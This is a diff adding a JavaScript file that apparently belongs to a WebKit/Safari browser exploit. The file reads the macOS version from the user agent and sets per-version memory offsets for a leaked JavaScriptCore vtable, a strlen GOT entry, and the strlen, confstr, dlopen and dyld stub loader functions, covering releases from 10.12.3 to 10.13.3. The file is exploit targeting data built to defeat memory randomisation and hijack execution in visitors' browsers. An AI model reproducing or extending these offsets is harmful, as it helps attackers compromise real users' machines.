@@ -1,0 +1,98 @@
+// We could get rid of this entire file by either searching for memory patters (of the function code) or
+// by writing a mach-o/dyld_shared_cache parser in JavaScript. Offsets are fine for this purpose though...
+
+// Offset of leaked vtable from the base of the JavaScriptCore .bss section
+//27 0x00000000     0 0x00536bb0 152145 -rw- 27.__DATA.__bss
+/*
+const JSC_VTAB_OFFSET = 0xd5f8;// 
+
+// Offset of GOT entry for strlen from the base of the JavaScriptCore .bss section
+const STRLEN_GOT_OFFSET = 0xde8; //0x00516a90
+
+// Offset of strlen from the base of libsystem_c.dylib
+const STRLEN_OFFSET = 0xfa0; //for 10.10.5
+
+// Offset of confstr from the base of libsystem_c.dylib
+const CONFSTR_OFFSET = 0x1c34; //for 10.10.5
+
+// Offset of dlopen from the base of libdyld.dylib
+const DLOPEN_OFFSET = 0x281c; //for 10.10.5
+
+// Offset of dyld_stub_loader from the base of libdyld.dylib
+const DYLD_STUB_LOADER_OFFSET = 0x12a0; //for 10.10.5
+*/
+
+var JSC_VTAB_OFFSET = 0;
+var DYLD_STUB_LOADER_OFFSET = 0;
+var STRLEN_GOT_OFFSET = 0;
+var STRLEN_OFFSET = 0;
+var CONFSTR_OFFSET = 0;
+var DLOPEN_OFFSET = 0;
+
+userAgent=navigator.userAgent;
+patern1=" OS X ";
+patern2=") AppleWebKit/";
+pos1=userAgent.indexOf(patern1)+patern1.length;
+pos2=userAgent.indexOf(patern2);
+ver=userAgent.substring(pos1,pos2);
+console.log(ver);
+
+switch(ver)
+{
+	case "10_12_3":
+	JSC_VTAB_OFFSET = 0xc458;
+	DYLD_STUB_LOADER_OFFSET = 0x1374;
+	STRLEN_GOT_OFFSET = 0xe80;
+	STRLEN_OFFSET = 0x1b40;
+	CONFSTR_OFFSET = 0x2c84;
+	DLOPEN_OFFSET = 0x2a03;
+	break;
+/*
+      '10.12.6' => {
+        :jsc_vtab => '0x0000d8d8',
+        :dyld_stub_loader => '0x00001168',
+        :dlopen => '0x000027f7',
+        :confstr => '0x00002c84',
+        :strlen => '0x00001b40',
+        :strlen_got => '0xdc0',
+      },
+*/
+	case "10_13":
+	JSC_VTAB_OFFSET = 0xe5f8;
+	DYLD_STUB_LOADER_OFFSET = 0x12a8;
+	STRLEN_GOT_OFFSET = 0xee8;
+	STRLEN_OFFSET = 0x1440;
+	CONFSTR_OFFSET = 0x24fc;
+	DLOPEN_OFFSET = 0x2e60;
+	break;
+
+	case "10_13_1":
+	JSC_VTAB_OFFSET = 0xe5f8;
+	DYLD_STUB_LOADER_OFFSET = 0x12a8;
+	STRLEN_GOT_OFFSET = 0xf00;
+	STRLEN_OFFSET = 0x1480;
+	CONFSTR_OFFSET = 0x24dc;
+	DLOPEN_OFFSET = 0x2e60;
+	break;
+
+	case "10_13_2":
+	JSC_VTAB_OFFSET = 0xe5e8;
+	DYLD_STUB_LOADER_OFFSET = 0x1278;
+	STRLEN_GOT_OFFSET = 0xee0;
+	STRLEN_OFFSET = 0x1420;
+	CONFSTR_OFFSET = 0x24dc;
+	DLOPEN_OFFSET = 0x2e30;
+	break;
+
+	case "10_13_3":
+	JSC_VTAB_OFFSET = 0xe5e8;
+	DYLD_STUB_LOADER_OFFSET = 0x1278;
+	STRLEN_GOT_OFFSET = 0xee0;
+	STRLEN_OFFSET = 0x1420;
+	CONFSTR_OFFSET = 0x24dc;
+	DLOPEN_OFFSET = 0x2e30;
+	break;
+
+	default:
+}
+
